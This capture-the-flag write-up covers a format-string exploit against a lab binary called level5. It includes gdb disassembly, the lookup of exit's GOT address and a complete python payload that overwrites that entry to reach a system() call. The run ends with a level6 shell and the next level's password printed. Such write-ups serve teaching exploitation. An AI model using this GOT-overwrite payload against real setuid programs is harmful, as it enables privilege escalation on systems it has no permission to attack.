# Level5

## What we have

```bash
GCC stack protector support:            Enabled
Strict user copy checks:                Disabled
Restrict /dev/mem access:               Enabled
Restrict /dev/kmem access:              Enabled
grsecurity / PaX: No GRKERNSEC
Kernel Heap Hardening: No KERNHEAP
System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
```

## Testing the program

```bash
$ ./level5
salut
salut
```

## Learning more


```bash
info functions
All defined functions:

Non-debugging symbols:
[...]
0x080484a4  o
0x080484c2  n
0x08048504  main
[...]
```

We have three functions : main, n and o. 

```bash
disas main
Dump of assembler code for function main:
   0x08048504 <+0>:	push   %ebp
   0x08048505 <+1>:	mov    %esp,%ebp
   0x08048507 <+3>:	and    $0xfffffff0,%esp
   0x0804850a <+6>:	call   0x80484c2 <n>
   0x0804850f <+11>:	leave  
   0x08048510 <+12>:	ret    
End of assembler dump.
```

There is a call to a function 'n'.

```bash
(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   %ebp
   0x080484c3 <+1>:	mov    %esp,%ebp
   0x080484c5 <+3>:	sub    $0x218,%esp
   0x080484cb <+9>:	mov    0x8049848,%eax
   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:	mov    %eax,(%esp)
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:	mov    %eax,(%esp)
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	movl   $0x1,(%esp)
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
```

As we can see the function 'o' is noit being called. 


```bash
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x18,%esp
   0x080484aa <+6>:	movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
   0x080484b6 <+18>:	movl   $0x1,(%esp)
   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
End of assembler dump.
```

The 'o' function does a call to system. 


## Getting access to the .pass

We need to use printf() function into calling the o() function using a format string attack.
The issue is that both the n() and o() function never return, they exit directly. 
Therefore we cannot overwriet n() so that the return calls o(). 

Instead we can replace the address of exit in the GOT with the address of o(). 

The GOT (Global Offset Table) is a table of addresses which contains the addresses of the shared library functions (printf, exit, fgets, ...). 

Also GOT is writable and whenever the function exit() is called (GOT entry of the function is looked up first) the program will jump to that address.
So if we replace the address of exit() in the GOT with the address of o() (with format strings), whenever that function will be called, the program will go to the modified GOT entry.

1. First : find the address of exit() and of o() in the GOT. 

```bash
$ objdump -R level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
```

```bash
info function o
All functions matching regular expression "o":

Non-debugging symbols:
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x08048420  __do_global_dtors_aux
0x080484a4  o
0x080485a0  __do_global_ctors_aux
(gdb) 
```

Now we have the address of exit(): 0x8049838 and the address of o(): 0x080484a4.

2. Print the memory until we reach exit

Like in previous levels, we are going to use printf to find where is the exit()

```bash
$ python -c 'print "aaaa" + " %x" * 10' > /tmp/exploit
$ cat /tmp/exploit - | ./level5
cat /tmp/exploit - | ./level5
aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078
```

The address of exit() is at the 4th position (61616161).

3. Final Payload

```plaintext
    • The address of exit(), 0x8049838 converted to little endian --> \x38\x98\x04\x08 
    • o() address in decimal : 0x080484a4 --> 134513828 - 4 bytes (because of the exit address) = 134513824
    • %4n : since the address of exit is at the 4th position
```

```bash
$ python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit
$ cat /tmp/exploit - | ./level5
        512
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```